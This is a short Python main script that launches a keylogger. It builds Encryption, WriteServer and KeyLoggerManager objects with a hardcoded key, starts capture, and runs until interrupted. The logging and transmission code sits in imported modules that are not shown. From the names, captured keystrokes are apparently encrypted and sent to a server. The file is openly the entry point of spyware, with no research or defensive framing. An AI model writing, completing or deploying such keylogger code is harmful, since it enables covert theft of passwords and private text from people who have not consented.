import time
from encryption import Encryption
from writeserver import WriteServer
from keyloggermanager import KeyLoggerManager


if __name__ == "__main__":
    key = "my-secret-key"

    encryption = Encryption()
    writer = WriteServer()
    manager = KeyLoggerManager(encryption, writer, key)

    manager.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
        print("Stopped gracefully")
